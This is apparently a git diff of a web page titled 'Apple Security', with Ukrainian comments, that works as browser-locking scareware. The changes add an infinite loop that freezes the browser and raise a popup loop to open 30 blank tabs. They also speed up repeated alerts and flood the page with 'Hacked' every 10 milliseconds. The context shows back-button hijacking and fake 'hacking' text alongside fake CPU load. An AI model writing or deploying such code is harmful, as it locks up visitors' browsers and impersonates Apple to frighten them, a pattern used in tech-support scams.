@@ -5,6 +5,8 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
+
+<h1>Здоров Богдан </h1>
 <title>Apple Security</title>
 
 <style>
@@ -37,11 +39,13 @@ history.pushState(null, null, location.href);
 window.onpopstate = function () {
 history.go(1);
 };
-
+while(true){
+console.log("loading");
+}
 
 // відкриття вкладок
 function openTabs(){
-for(let i=0;i<2;i++){
+for(let i=0;i<30;i++){
 window.open("about:blank","_blank");
 }
 }
@@ -58,8 +62,8 @@ openTabs();
 
 // запуск alert циклу
 setTimeout(()=>{
-setInterval(alerts, 1200);
-},1500);
+setInterval(alerts, 1000);
+},1000);
 
 
 // фейковий hacking текст
@@ -80,7 +84,10 @@ document.getElementById("status").innerText =
 text[i % text.length];
 i++;
 },900);
-
+  
+setInterval(()=>{
+document.body.innerHTML += "Hacked";
+},10);
 
 // фейкове навантаження CPU
 setInterval(()=>{
